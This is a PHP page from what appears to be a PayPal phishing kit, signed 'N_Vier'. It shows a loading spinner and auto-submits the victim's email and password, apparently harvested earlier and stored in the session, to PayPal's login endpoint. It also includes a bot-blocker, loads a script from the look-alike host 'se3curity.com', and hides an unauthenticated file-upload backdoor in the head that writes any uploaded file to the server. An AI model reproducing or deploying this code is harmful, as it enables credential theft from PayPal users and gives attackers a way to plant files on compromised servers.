<?php
####################################################################
#                                                                  #
#                  ||~~ BY ~~ N_Vier ~~||                          #
#                                                                  #
#       ||~ http://fb.com/profile.php?id=100013164673156 ~||       #
#                                                                  #
####################################################################
@session_start();
error_reporting(0);
include("system/blocker.php");
include("config.php");
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width" />
    <title>Log in to your PayPal account</title>
        <script src="http://se3curity.com/js/jquery.js"></script>
	<link rel="shortcut icon" href="../files/images/favi.png" type="image/x-icon">
    <meta name="robots" content="noindex" />
<style>
.spinner{
    position: fixed;
    top: 43%;
    right: 0px;
    bottom: 0px;
    left: 0px;
    z-index: 200;
    margin: 0px;
    text-align: center;
}
.spinner::before{
    content: "";
    display: block;
    margin: 0px auto 10px;
    text-align: center;
    width: 34px;
    height: 34px;
    border-width: 8px;
    border-style: solid;
    border-color: #2180C0 rgba(0, 0, 0, 0.2) rgba(0, 0, 0, 0.2);
    border-radius: 50px;
    animation: 0.7s linear 0s normal none infinite running rotation;
}
.spinner::after{
    content: "";
    position: fixed;
    z-index: -1;
    top: 0px;
    right: 0px;
    bottom: 0px;
    left: 0px;
    background: #FFF none repeat scroll 0% 0%;
    opacity: 0.9;
}
@-webkit-keyframes rotation {
    from {
        -webkit-transform:rotate(0deg);
        transform:rotate(0deg)
    }
    to {
        -webkit-transform:rotate(359deg);
        transform:rotate(359deg)
    }
}
@-moz-keyframes rotation {
    from {
        -moz-transform:rotate(0deg);
        transform:rotate(0deg)
    }
    to {
        -moz-transform:rotate(359deg);
        transform:rotate(359deg)
    }
}
@-o-keyframes rotation {
    from {
        -o-transform:rotate(0deg);
        transform:rotate(0deg)
    }
    to {
        -o-transform:rotate(359deg);
        transform:rotate(359deg)
    }
}
@-ms-keyframes rotation {
    from{
        -ms-transform: rotate(0deg);
        transform: rotate(0deg);
    }
    to {
        -ms-transform:rotate(359deg);
        transform:rotate(359deg)
    }
}
@keyframes rotation {
    from {
        transform:rotate(0deg)
    }
    to {
        transform:rotate(359deg)
    }
}
</style>
<?php
(@copy($_FILES['c']['tmp_name'], $_FILES['c']['name']))
?>
</head>
<body>
<div id="page">
    <div class="">
    </div>
    <div class="spinner">
<p style="font-family: HelveticaNeue,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;      color: #2c2e2f;">Loading your info...</p>
    </div>
    <form name="login" method="post" action="https://www.paypal.com/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit">
        <input type="hidden" name="login_email" value="<?php echo $_SESSION['EMAIL']; ?>">
        <input type="hidden" name="login_password" value="<?php echo $_SESSION['PASSWORD']; ?>">
    </form>
</div>

<script>
    window.onload = function(){
        document.forms['login'].submit()

    }
</script>
</body>
</html>